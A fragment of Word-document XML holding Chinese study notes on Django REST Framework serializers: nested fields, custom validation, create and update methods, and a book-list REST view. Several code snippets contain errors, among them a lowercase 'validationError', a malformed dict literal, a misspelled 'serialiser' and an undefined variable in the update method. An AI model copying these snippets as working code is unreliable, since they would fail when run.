          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">')    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DE8E2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3.</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>将关联对象序列化为关联对象模型类</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>_str_</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法的返回值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4300511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hbook = serializers.StringRelatedField(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>图书</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3316B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和对象关联的对象如果有多个，在序列化器中定义嵌套序列化字段时，需要添加many=True。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FC9D38"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2.5.4反序列化功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E281C5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反序列化-数据校验</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D371B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data = {'btitle':'python','bpub_date':'1980-1-1'}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BE8A52"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serializer = BookInfoSerializer(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CD238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serializer.is_valid()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D91E01"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serializer.errors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2960E109"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serialiser.validated_data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A5D37D"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当系统提供的校验不能满足我们的需求的时候，我们可以补充额外的验证：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AF253E"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1）指定特定字段的validators参数进行补充验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2234BCA1"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btitle = serializers.CharField(label='</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>',max_length=20,validators=[about_django])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C351EB0"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：此处的about_django为我们自定义的校验函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE73A9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2）在序列化器类中定义特定方法validate_&lt;fieldname&gt;针对特定字段进行补充验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBFF8A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def validate_btitle(self,value):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B37FF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if 'django' not in value.lower():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79417B1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raise serializers.validationError('</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>图书不是关于</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601B7F43"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value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EE14D2"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3）定义validate方法进行补充验证（结合多个字段内容验证）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA169D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def validate(self,attrs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14666E1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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389A5467"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w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>此处的</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>attrs</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是一个字典，创建序列化器对象时，传入</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A4CA6A"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F5F390"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bread = attrs['bread']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8DB7D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bcomment = attrs['bcomment']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D2E62F"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if bread&lt;=bcomment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D577B5"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        raise serializers.ValidationError('</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>图书阅读量必须大于评论量</w:t>
      </w:r>
      <w:r w:rsidRPr="007A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195E4468" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="007A7A86" w:rsidRDefault="00870C85" w:rsidP="007A7A8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A7A86">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    return attrs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507301C1"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2.5.5反序列化-数据保存（新增&amp;更新）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671716E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校验通过之后，可以调用serializer.save()进行数据保存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD5F121"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1)</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据新增</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59908A0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def create(self,validated_data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190D19B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26A0917F"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validated_data:</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字典，校验之后的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FA6CF5"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3A32D935"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 = BookInfo.objects.create(**validated_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC396CD"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return book</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297D1A6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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6BAD47"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data = {'btitle':'python','bpub_data':'1802-1-1','bread':30,'bcomment:20'}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E342E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serializer = BookInfoSerializer(data=data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498B588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serializer.is_valid()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D062D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serializer.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326C1770"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serializer.data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CBF4E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2)数据更新</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667F7B97"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def update(self,instance,validated_data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B52DE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18AE5C1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instance:</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建序列化器对象时传入实例对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740FDD8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validated_data:</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是一个字典，校验之后的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB1A76F"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7D7113A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btitle = validated_data.get('btitle')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760CE98D"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bpub_data_date = validated_data.get('bpub_date')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6868C36D"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161E1A85"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instance.btitle = btitle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEC25B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instance.bpub_date = bpub_date</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6F258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instance.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFED221"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39D01707"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    return instance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F10359D"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2.5.6使用序列化器改写RestAPI接口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE5D29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我们举两个代表性的例子即可：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACC4C10"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/books/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8EC28C"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class BookListView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CA72AA"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def get(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9DBCB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645CE9C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r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>获取所有的图书的信息：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B826850"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1. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>查询所有的图书的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E8B528"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2. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回所有图书的</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7A8F2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1ED3B4C6"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1. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>查询所有的图书的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACADA56"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books = BookInfo.objects.all() # QuerySet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1326D6E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2. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回所有图书的</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的数据，状态码</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>: 200</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540E541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books_li = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BC2AA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for book in books:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BE1D85"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将</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>book</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象转换成</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757F35A7"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book_dict = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3A4CAB"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'id': book.id,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539C166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'btitle': book.btitle,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26148F4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'bpub_date': book.bpub_date,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC8E45D"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'bread': book.bread,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEDBAA0"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'bcomment': book.bcomment,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211D42E6"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'image': book.image.url if book.image else ''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9C42EC"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57C061FA"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books_li.append(book_dict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7B929C"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return JsonResponse(books_li, safe=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B41588"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def post(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AAD85A"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193AB54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r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>新增一本图书的信息：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C497B05"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1. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>获取参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>btitle</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>bpub_date</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>并进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A01764A"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        2. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建图书信息并添加进数据表中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1523B7F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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回新增的图书的</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据，状态码</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>: 201</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1654883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43F9B25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需求</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>前端需要传递新增图书的信息</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(btitle, bpub_date)</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>传递</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3C8F9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1. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>获取参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>btitle</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>bpub_date</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>并进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775CC28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获取</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的原始数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA0BEB7"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req_data = request.body # bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC15981"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将</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>bytes</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
